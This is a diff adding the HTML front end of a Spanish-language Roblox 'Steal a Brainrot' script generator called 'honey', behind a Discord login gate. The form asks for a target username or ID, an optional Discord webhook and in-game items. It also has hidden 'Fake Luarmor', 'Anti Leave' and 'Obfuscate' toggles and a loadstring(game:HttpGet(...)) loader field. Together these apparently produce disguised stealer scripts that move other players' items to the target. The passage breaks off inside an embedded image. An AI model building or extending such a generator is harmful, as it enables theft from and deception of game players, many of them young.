+#discordAuthGate .discord-login-btn:active{transform:scale(.985)}
+#discordAuthGate .discord-login-btn svg{width:23px;height:23px;fill:#fff;flex:none}
+#discordAuthGate .auth-status{display:block;min-height:0;margin-top:14px;color:#fca5a5;font-size:12px;line-height:1.5;position:relative;z-index:1}
+#discordAuthGate .honen-note{margin-top:16px;padding:13px 14px;border:1px solid #303038;border-radius:14px;background:#17171c;color:#d4d4d8;font-size:13px;line-height:1.55;position:relative;z-index:1}
+#discordAuthGate .honen-note p{margin:0}
+#discordAuthGate .honen-server-btn{width:100%;min-height:58px;display:flex;align-items:center;justify-content:center;margin-top:14px;padding:14px 18px;border:1px solid #45454e;border-radius:15px;background:#202026;color:#fff;text-decoration:none;font-size:14px;font-weight:850;position:relative;z-index:1;transition:.2s}
+#discordAuthGate .honen-server-btn:hover{background:#292930;border-color:#85858f;transform:translateY(-1px)}
+#discordAuthGate .honen-foot{margin-top:27px;padding-top:18px;border-top:1px solid #29292f;color:#777780;font-size:11px;line-height:1.7;text-align:center;position:relative;z-index:1}
+#discordAuthGate .honen-foot a{color:#c9c9d0;text-decoration:none}
+#discordAuthGate .honen-foot a:hover{color:#fff;text-decoration:underline}
+@media(max-width:480px){#discordAuthGate{padding:16px}#discordAuthGate .auth-box{padding:28px 22px;border-radius:23px}#discordAuthGate .honen-welcome{font-size:31px}}
+@media(prefers-reduced-motion:reduce){#discordAuthGate .auth-box{animation:none}}
+
+</style>
+</head>
+<body>
+<div class="bg">
+  <div class="bg-grid"></div>
+  <div class="orb orb1"></div>
+  <div class="orb orb2"></div>
+  <div class="particles" id="particles"></div>
+</div>
+
+<!-- TOP BAR FIJO -->
+<div class="top-bar">
+  <div class="top-bar-left">
+    <span class="top-bar-logo">𝔥𝔬𝔫𝔢𝔶</span>
+  </div>
+  <div class="top-bar-right">
+    <div class="user-pill" id="userPill">
+      <img id="userAvatar" src="" alt="">
+      <span id="userName"></span>
+      <button class="logout-btn" id="logoutBtn">Salir</button>
+    </div>
+    <div class="lang-wrap">
+      <button class="lang-btn" id="langBtn">
+        <img id="langFlag" src="https://flagcdn.com/es.svg" alt="ES">
+      </button>
+      <div class="lang-menu" id="langMenu">
+        <div class="lang-item active" data-lang="es">
+          <img src="https://flagcdn.com/es.svg" alt="ES">
+          <div class="lang-text"><div class="lang-name">Español</div><div class="lang-sub">es</div></div>
+          <span class="check" id="chk-es">✓</span>
+        </div>
+        <div class="lang-item" data-lang="en">
+          <img src="https://flagcdn.com/gb.svg" alt="EN">
+          <div class="lang-text"><div class="lang-name">English</div><div class="lang-sub">en</div></div>
+          <span class="check" id="chk-en"></span>
+        </div>
+        <div class="lang-item" data-lang="pt">
+          <img src="https://flagcdn.com/br.svg" alt="PT">
+          <div class="lang-text"><div class="lang-name">Português</div><div class="lang-sub">pt</div></div>
+          <span class="check" id="chk-pt"></span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- USER MENU -->
+<div class="user-menu" id="userMenu">
+  <div class="user-menu-item" id="autoSaveOption">
+    <span>Auto-guardado</span>
+    <span class="autosave-badge" id="autoSaveBadge">ON</span>
+  </div>
+  <div class="user-menu-item" id="scriptsHistoryOption">
+    <span>Scripts Generados</span>
+    <span style="color:var(--white3);font-size:12px">📜</span>
+  </div>
+</div>
+
+<!-- HONEN DISCORD LOGIN: UI basada en discord_login.html -->
+<div class="auth-gate" id="discordAuthGate">
+  <main class="auth-box">
+    <div class="honen-brand">
+      <div class="honen-mark" id="guildMark" aria-label="Honen server logo">
+        <span id="guildFallback">H</span>
+        <img id="guildLogo" alt="Honen server icon" hidden>
+      </div>
+      <div class="honen-brand-name">HONEN</div>
+    </div>
+
+    <p class="honen-eyebrow">SECURE ACCESS</p>
+    <h2 class="honen-welcome">Welcome.</h2>
+    <p class="honen-desc" id="authDesc">Sign in with your Discord account to continue. This page never asks for your Discord password.</p>
+
+    <button class="discord-login-btn" id="discordLoginBtn" type="button">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M19.7 5.3A18.4 18.4 0 0 0 15.2 4l-.6 1.2a16.7 16.7 0 0 0-5.2 0L8.8 4a18.4 18.4 0 0 0-4.5 1.3C1.5 9.5.7 13.6 1.1 17.6a18.2 18.2 0 0 0 5.5 2.8l1.2-2a11.8 11.8 0 0 1-1.9-.9l.5-.4a13 13 0 0 0 11.2 0l.5.4a11.8 11.8 0 0 1-1.9.9l1.2 2a18.2 18.2 0 0 0 5.5-2.8c.5-4.6-.8-8.7-3.2-12.3ZM8.7 14.8c-1 0-1.8-.9-1.8-2s.8-2 1.8-2 1.8.9 1.8 2-.8 2-1.8 2Zm6.6 0c-1 0-1.8-.9-1.8-2s.8-2 1.8-2 1.8.9 1.8 2-.8 2-1.8 2Z"/></svg>
+      Login with Discord
+    </button>
+
+    <div class="auth-status" id="authStatus" role="status" aria-live="polite"></div>
+    <div class="honen-note" id="joinServerBanner" style="display:none">
+      <p>Debes unirte al servidor de Honen para continuar.</p>
+    </div>
+    <a class="honen-server-btn" id="joinServerBtn" href="https://discord.gg/GAu8ccgr4X" target="_blank" rel="noopener">Open Honen Server</a>
+
+    <div class="honen-foot">By continuing, you authorize this connection with Discord.<br>
+      <a href="https://discord.com/developers/docs/topics/oauth2" target="_blank" rel="noopener">OAuth2 documentation</a>
+    </div>
+  </main>
+</div>
+
+<!-- HISTORY MODAL -->
+<div class="modal-overlay" id="historyModal">
+  <div class="modal-box">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem">
+      <h3>📜 Scripts Generados</h3>
+      <button class="modal-close" id="historyCloseBtn">✕</button>
+    </div>
+    <div id="historyList"></div>
+  </div>
+</div>
+
+<!-- INPUTS OCULTOS para los toggles (siempre activos) -->
+<input type="checkbox" id="togglePastefy" checked style="display:none">
+<input type="checkbox" id="toggleFakeLuarmor" style="display:none">
+<input type="checkbox" id="toggleAntiLeave" checked style="display:none">
+<input type="checkbox" id="toggleObfuscate" style="display:none">
+
+<div class="wrap">
+  <div class="card">
+    <div class="card-line"></div>
+
+    <!-- HEADER -->
+    <div class="header">
+      <div class="logo-container"><span class="logo-icon">🧠</span></div>
+      <h1>𝔥𝔬𝔫𝔢𝔶</h1>
+      <p id="subtitle">Generación automática de scripts para tus targets de Roblox</p>
+      <a href="https://discord.gg/GAu8ccgr4X" target="_blank" class="discord-link">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057.1 18.1.12 18.14.144 18.163a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
+        Únete al servidor
+      </a>
+    </div>
+
+    <div class="badges">
+      <span class="badge">🎮 Roblox</span>
+      <span class="badge">🧠 Steal a Brainrot</span>
+      <span class="badge">⚡ Auto Script</span>
+    </div>
+
+    <!-- TARGET USER -->
+    <div class="field">
+      <label class="lbl" id="lbl-target">TARGET USERNAME / ID / URL</label>
+      <input class="inp" id="targetUser" type="text" placeholder="@username, ID o perfil URL" autocomplete="off">
+      <div class="lookup-status" id="lookupStatus"></div>
+    </div>
+    <div class="field">
+      <label class="lbl" id="lbl-targetId">TARGET ID (auto-detectado)</label>
+      <input class="inp" id="targetId" type="text" placeholder="1234567890" autocomplete="off">
+    </div>
+    <div class="field">
+      <label class="lbl">WEBHOOK URL (opcional)</label>
+      <input class="inp" id="webhookUrl" type="text" placeholder="https://discord.com/api/webhooks/..." autocomplete="off">
+    </div>
+
+    <!-- SCRIPT MODE -->
+    <div class="field">
+      <label class="lbl" id="lbl-mode">MODO DE SCRIPT</label>
+      <div class="mode-tabs">
+        <div class="mode-slider" id="modeSlider"></div>
+        <button class="mode-btn active" data-mode="NO-GUI" data-index="0">NO-GUI</button>
+        <button class="mode-btn" data-mode="AUTO-CODE" data-index="1">AUTO CODE</button>
+        <button class="mode-btn" data-mode="DUEL" data-index="2">DUEL</button>
+        <button class="mode-btn" data-mode="CUSTOM" data-index="3">CUSTOM</button>
+      </div>
+      <div class="custom-area" id="customArea">
+        <input class="inp" id="customLoader" placeholder="loadstring(game:HttpGet(\"...\"))()" style="font-size:11px;font-family:monospace">
+      </div>
+    </div>
+
+    <!-- BRAINROTS -->
+    <div class="field">
+      <label class="lbl" id="lbl-brainrots">BRAINROTS</label>
+      <div class="position-relative">
+        <button class="br-select-btn" id="brToggle">
+          <span id="brCount">Selecciona brainrots...</span>
+          <span class="arrow">▾</span>
+        </button>
+        <div class="dd" id="brDropdown">
+          <div class="cat-tabs">
+            <button class="cat-btn active" data-cat="all">Todos</button>
+            <button class="cat-btn" data-cat="OG">OG</button>
+            <button class="cat-btn" data-cat="Secret">Secret</button>
+          </div>
+          <div class="dd-search"><input id="brSearch" placeholder="🔍 Buscar brainrot..."></div>
+          <div class="mps-filter-row">
+            <input id="mpsFilter" placeholder="Mín. MPS (ej: 100M)">
+            <button id="mpsFilterBtn">Filtrar</button>
+          </div>
+          <div class="br-list" id="brList"></div>
+          <div class="dd-footer">
+            <button id="selectAllBtn">Seleccionar todos</button>
+            <button id="deselectAllBtn">Deseleccionar</button>
+            <button id="doneBtn">✓ Listo</button>
+          </div>
+        </div>
+      </div>
+      <div class="tags" id="brTags"></div>
+    </div>
+
+    <!-- GEARS -->
+    <div class="field">
+      <label class="lbl" id="lbl-gears">GEARS</label>
+      <div class="position-relative">
+        <button class="br-select-btn" id="gearsToggle">
+          <span id="gearsCount">Selecciona gears...</span>
+          <span class="arrow">▾</span>
+        </button>
+        <div class="dd" id="gearsDropdown">
+          <div class="dd-search"><input id="gearsSearch" placeholder="🔍 Buscar gear..."></div>
+          <div class="br-list" id="gearsList"></div>
+          <div class="dd-footer">
+            <button id="gearsSelectAllBtn">Seleccionar todos</button>
+            <button id="gearsDeselectAllBtn">Deseleccionar</button>
+            <button id="gearsDoneBtn">✓ Listo</button>
+          </div>
+        </div>
+      </div>
+      <div class="tags" id="gearsTags"></div>
+    </div>
+
+    <!-- BASES -->
+    <div class="field">
+      <label class="lbl" id="lbl-bases">BASE SKINS</label>
+      <div class="position-relative">
+        <button class="br-select-btn" id="basesToggle">
+          <span id="basesCount">Selecciona bases...</span>
+          <span class="arrow">▾</span>
+        </button>
+        <div class="dd" id="basesDropdown">
+          <div class="dd-search"><input id="basesSearch" placeholder="🔍 Buscar base..."></div>
+          <div class="br-list" id="basesList"></div>
+          <div class="dd-footer">
+            <button id="basesSelectAllBtn">Seleccionar todas</button>
+            <button id="basesDeselectAllBtn">Deseleccionar</button>
+            <button id="basesDoneBtn">✓ Listo</button>
+          </div>
+        </div>
+      </div>
+      <div class="tags" id="basesTags"></div>
+    </div>
+
+    <!-- OPCIONES ACTIVAS (chips, sin toggles) -->
+    <div class="active-options">
+      <span class="opt-chip"><span class="dot"></span>📋 Pastefy ON</span>
+      <span class="opt-chip"><span class="dot"></span>🛡️ Anti Leave ON</span>
+    </div>
+
+    <button class="gen-btn disabled" id="generateBtn" disabled>⚠️ SELECCIONA AL MENOS UN TARGET</button>
+
+    <div class="result" id="result">
+      <div class="result-header">
+        <span id="lbl-generated">📜 Script generado</span>
+        <button class="copy-btn" id="copyBtn">📋 Copiar</button>
+      </div>
+      <pre class="script-box" id="scriptOutput"></pre>
+    </div>
+  </div>
+
+  <!-- CREDITS CARD -->
+  <div class="credits-card">
+    <div class="credits-title">CRÉDITOS</div>
+
+    <div class="credit-item">
+      <div class="credit-left">
+        <img class="credit-avatar" src="https://cdn.discordapp.com/embed/avatars/1.png" onerror="this.style.display='none'" alt="Mazuri">
+        <div class="credit-info">
+          <div class="credit-name-row">
+            <span class="credit-name">Mazuri</span>
+            <span class="credit-badge cb-owner">👑 OWNER</span>
+          </div>
+          <span class="credit-role">Owner</span>
+        </div>
+      </div>
+      <div class="credit-right">
+        <a href="https://discord.com/users/1028107309970362388" target="_blank" class="credit-discord">@cyanam1</a>
+        <a href="https://dsc.gg/honen" target="_blank" class="credit-join">🔗 Join Server</a>
+      </div>
+    </div>
+
+    <div class="credit-item">
+      <div class="credit-left">
+        <img class="credit-avatar" src="https://cdn.discordapp.com/embed/avatars/3.png" onerror="this.style.display='none'" alt="Sub Owner">
+        <div class="credit-info">
+          <div class="credit-name-row">
+            <span class="credit-name">asier0219</span>
+            <span class="credit-badge cb-subowner">🌙 SUB OWNER</span>
+          </div>
+          <span class="credit-role">Sub Owner</span>
+        </div>
+      </div>
+      <div class="credit-right">
+        <a href="https://discord.com/users/1344330986283864156" target="_blank" class="credit-discord">@asier0219</a>
+        <a href="https://dsc.gg/honen" target="_blank" class="credit-join">🔗 Join Server</a>
+      </div>
+    </div>
+
+  </div>
+      <div class="credit-right">
+        <a href="https://discord.com/users/1452133043165986950" target="_blank" class="credit-discord">@adierxd23</a>
+        <a href="https://discord.gg/UA9xGPKAqE" target="_blank" class="credit-join">🔗 Join Server</a>
+      </div>
+    </div>
+
+    <div class="credit-item">
+      <div class="credit-left">
+        <img class="credit-avatar" src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExMGk0Ym45c3l5amdpaTljeHFidXN3OGsxZmFvdjFxdHZqazFrOHh5NyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/OTlZdN8x0Y6ZjIh0cQ/giphy.gif" onerror="this.style.display='none'" alt="Edwxn">
+        <div class="credit-info">
+          <div class="credit-name-row">
+            <span class="credit-name">Edwxn</span>
+            <span class="credit-badge cb-owner">✨ Co-Owner</span>
+          </div>
+          <span class="credit-role">Co-Owner y Colaborador</span>
+        </div>
+      </div>
+      <div class="credit-right">
+        <a href="https://discord.com/users/1422951543120068759" target="_blank" class="credit-discord">@edwxn0947</a>
+        <a href="https://discord.gg/UA9xGPKAqE" target="_blank" class="credit-join">🔗 Join Server</a>
+      </div>
+    </div>
+
+    <div class="credit-item">
+      <div class="credit-left">
+        <img class="credit-avatar" src="https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExZ2o1anNreTVnZW1wNTNwanMzenI5Yjc2OXJubnhnZ3l5MGZxNHh0aCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/E2HuDvc9T7w6e1rYI9/giphy.gif" onerror="this.style.display='none'" alt="SpyderGoat">
+        <div class="credit-info">
+          <div class="credit-name-row">
+            <span class="credit-name">SpyderGoat</span>
+            <span class="credit-badge cb-dev">👩‍💻 DEV</span>
+          </div>
+          <span class="credit-role">Desarrollador</span>
+        </div>
+      </div>
+      <div class="credit-right">
+        <a href="https://discord.com/users/752250822368166011" target="_blank" class="credit-discord">@spydergoatdevsab</a>
+        <a href="https://discord.gg/d2EgKtBbM" target="_blank" class="credit-join">🔗 Join Server</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════
+// CONFIG
+// ═══════════════════════════════════════════════════
+const DISCORD_GATE_IMAGE_URL = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMAAwICAwICAwMDAwQDAwQFCAUFBAQFCgcHBggMCgwMCwoLCw0OEhANDhEOCwsQFhARExQVFRUMDxcYFhQYEhQVFP/bAEMBAwQEBQQFCQUFCRQNCw0UFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFP/AABEIBgACswMBIgACEQEDEQH/xAAeAAEAAgIDAQEBAAAAAAAAAAAAAQIDBQQGBwgJCv/EAEwQAQABAwMDAQYDAwcGDAcBAAABAgMRBAUxBhIhBxMUIjJBUQhhcRVTgQkjM0JSVJEWNqGy0dIXJDQ1Q3J0kpOxweEYJVVWYoKzR//EABcBAQEBAQAAAAAAAAAAAAAAAAACAQP/xAAaEQEBAQADAQAAAAAAAAAAAAAAARECEjFB/9oADAMBAAIRAxEAPwD8qgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADE/aVrdybdcVRzH3bCzqqL1Ex2xFabcXxkv1rcT9hsL8Ys1/fDXtl1nLj1AGpAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE0VTRVEx9EAOTc1cV0TT28w4wMzG22+gDWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD6P9avwI+oXot6UbB6h6mdJvvTm52Ld6/f2uZue498RNMXPynPzR4z4fOD7q/AZ+Pe16XWo9L/VSY3j0w3OJ01N7VUe2/Z3f4mKo891mc+Y5p5j6xIfCruHpP6T9S+tXXG3dKdKbdc3HddZXFMRRE9tqnPmuuf6tMfWX2t+Kf+S76i231F2fcvRjSf5R9D9T6ij3emzdi5Ttk3Piiaq84nT4nNNzM4jxP0mfbd83n07/AJKT0ap2nafdupvWjfdNm5emImaZx89Uc0WaZ+WnmqYB+dX4nvw175+Fr1DtdI7/ALlod01l3R29bTe0FUzTFNeY7aonzExNM/wxP1eQuwdfdfb96n9W7j1L1LuN7dN5192bt/U3qszMz9I+0RxEOvgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAO4ek3pL1R629c7d0n0jtl3dN41tfbTRRGKLdP8AWuV1cU0xHmZl0+IzMRnH5v1W2X1V9IP5Oj8O2hvdDa/bOu/VTqfSU3Z1unuU3O2aozm5MTM0W6J4o8TVMeQe+9Gepnpz/Jz+m/QPpT1v1zq983vWXfjrqqm7Toqbk/FVFPNrTU1eKYnzOapx5mI+If5Sb8IfUXTfVuu9Yti3XV9a9F9Q3I1V3XV3feLmimqM00zVHNrHyzHiI8Pirr/r/f8A1Q6u3Lqfqfc727b1uF2bt/VX6szMzxER9KY4iI8RD7M/Ad+PK16caf8A4LfVOY3r023OPdbdzWR7SNBFfiaaonm1OfMfTmAfCY96/Gt6denvpr65bhoPTPf9PvvTOps0ayiNNci5RpK68zNmK4+bHif0nDwUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOZ+x9b/d6z9j63+71u6Dt0g6X+x9b/d6z9j63+71u6DnZg6X+x9b/AHes/Y+t/u9bugkdL/Y+t/u9Z+x9b/d63dAHS/2Prf7vWfsfW/3et3QB0v8AY+t/u9Z+x9b/AHet3QbIOl/sbW/3etP7F1392rdzjllYOkfsPX/3as/Yev8A7rW73TwlOjof7D1392rVnZtbTEzOnriId8n6tXvOq92sc/ModNqtV0TMTTMTCrkxcm9Nc/k4/bIIE9snb9wQYWAVwYWAVwYWAVwYWAVwYWAVwYWAVwntn7JWjgFO2fsds/ZkAY+2fsds/ZkAY+2fsds/ZknwAx9s/Y7J+zItHAMPZV9pOyr7SzgMHZV9pOyfszongGHtn7IxLKrPIKYMLAIpomqcRGZZqNBqLvy2qqv0Y6a5omJhvNt1Hwg1M7Zqo5s1Ebbqp/6Gp2Cbk1fVaiucA67O26mP+hqR+ztT+5qdlzkB1r9nan9zUfs7U/uanZQHWv2dqf3NSPcNR+6qdknlQHXvcNR+6qPcNR+6qdhAde9w1H7qo9xv/uqnYJ4VBofcb/7qo9xv/uqm+AaH3G/+6qPcb/7qpvgGg9yv/uqj3K/+7qb2eUA0fuV/93J7ne/d1N5PCoNL7ne/d1Hud793U3QDS+53v3dR7ne/d1N0A0vud793Ue53v3dTdANL7ne/dyj3W7/Ylup4Ygar3W7/AGJPdbv9iW1Aar3W7/Yk91u/2JbUBqvdbv8AYkbUB2bEmJZR37DFiTEsoijFiRlVmjLMFBb2f5ns/wA2Cot7P8z2f5grHLJ2x9lYowu0R2x9kie1lgmJ8LUqxGIO7H5JFLtfZEy6nvmtnUXe2J8RLe7pq/ZW6oz5l1C/V33Jn6gpEzTx4WUXARUlFQKgAAAAAAAAAAALRwqtHAJABMcpwrE4cvTaf29VNPGQceYRhydXppsVYmc4ccEYSAAAAIBE/RGCZyiZxIJwYAFaqcw5W33+yrGXHktfDcgG/ifEMtPDHZxVRE/kzRTgCJ8rIiMJAJ8CtXkZqtVWUJ7TtDUCe07Q1WeFV5p8K9o1AntRPgAR3HcCJ5QAE8KrTwqAAAAAACJ4YmWeGIAAAAAAHbe0xCRQjEGISKgjEK1RifC4rBQXE4KC4YKC4yikcrgArVTMeZjwtHMMW46n2FifP0Tg6zvmp/naqY+jScuTrr8371UuMwF1FwEVJRUCoAAAAAAAAAAAC0cKrRwCSIyGZjjkE9s/Zy9omfeo7uIlXTae7f8AuvRHu12YnmJBst008VfFHlp5t9s4mG1jVReoxnhwr1OZmQcfthjnlnmnDHNHnkFBM09qAETwkBRWeV6kAAAEchHINvoLk47WxavQ/M2kcAAAK1crAhQXAUFwapPCqyKhSFKvqupVAKCZjEIAAAnhVafMI7QQJ7TtBAntVBIAInhiZZ8wr7P8wUEzGJQAAAADtwDpIADQAaADAAAASACBEziMtPvt+atPMR4mG2uTiiZaDdb0TTMSDreZnnkWq+acKgJygBOUefqAAAAAAACY5QmOQTiDEJARiDEJARiEgAtb+eCIwyW6Z7okG+2qIxHhytPoLWo1dUV2u6Zlh2mnh3DYtrou66zOM5nyDoOvse46yu37OaKa58Iuaar2U1TTiI+v3eqepfQvuG32NfRa7o7e6cOv3dBa3Tpy3c09ntrt0ZuSDz/GVJp5Zq6JpvTR+a/u81eOAcPGeTthnvWJt48sXaCvbCJpjEr4Y66voDHP0UnlbKs8gZMoATkygngGw2y98UZbyZzjDrGkudlyHYbFz2lESDKAAAMwAGiYjKE0srCaIwr2wvPmEdqWK9kMVdOGftUromQYJMQyVUThXtVGxXEGIXjxCWtY5iFWWYVBQXAUMQvPCgGIRMYSirgEAnuBWaYmUdsL4yifAKzTDGv3/kjskFRbskB2zBhYdRXBhYBXAsiQQAAAUAEgAgYtTOLFc/k6fuN+aqph2/V/8nr/AEdL1/8ASSDhgAAAAAAAAAAAJjlCY5BYAA+pEZKvhwBPgpnMtjb2ybtjvww2dJPtMfmDFTbZ7ViqaoiKZlzKNFw2ml0vZETgFduibM098dv6u6bHrKdJqLNecxl0/cvFVqPybLaL03IiM/KD3rW7ppOpumfcqsVVdmPMvJ9uv2tkt7xobkxiqO2n/Q9p9NfTK51B0/du27lNu/VTmianSNf6P7hY37U2twoqxVXimuqMRX+gPEbujoq1VVUeYywain2dyfGId46s6PudM6+5RXTiiZxT4dS3WziiJwDUavzTTLjOfVa77EZ+jg1R2zgFZ4YK48y5DFdjxyDDjKs8rKzyCAAAARxV4dg2yvusRl1+Pnb3bZ/m4gHPCYwAAAAAJicIAW7o+53R91RmMxbuj7omcoDGIr+WWPEsskM8YxxEJxCZpnOcoxMGqRMYY55ZKlJpNagT2piMKFZ4VwyTwqCuFauGRFQMYsAinhFbJTwioHGxP2ZY4F44BUWAdoEdx3OokR3HcCUVcnciZyAAAAUAEgCJ8IGDW1Y0tz8odJ1Nzvrl27c70UaW7E/WHTK5zkFAAAAAAAAAAAAExyhMcgsRGZExyCYjDJTbpqmMq01YZqJzMA7ltG3xqNlu1duZjhqqdDVb1cRMeJdu6FijX7bd08RiqZ5lavY67+606eI7KpnETIOuUWacz44ci1iIU1tqrQa2uxXHnOMuPqNTFmcT9QNfXTVj8nG2jXVW9VMZ+DPlx9Td9rnEuNt+aqrlMTiqJB91+he6U6rYtPNuqMWqY7od79WbVOr0uz6mzFNU2omau3+L5u/Dd1dNmL+31zM1VYph7LuPV0aHT6+3uFNV2imMW4gHj/rbtdV7Q6XWTGYqzVw8H11n2tETh9KeoGop33pGq9TTNNum3M0xPMPnOuun2U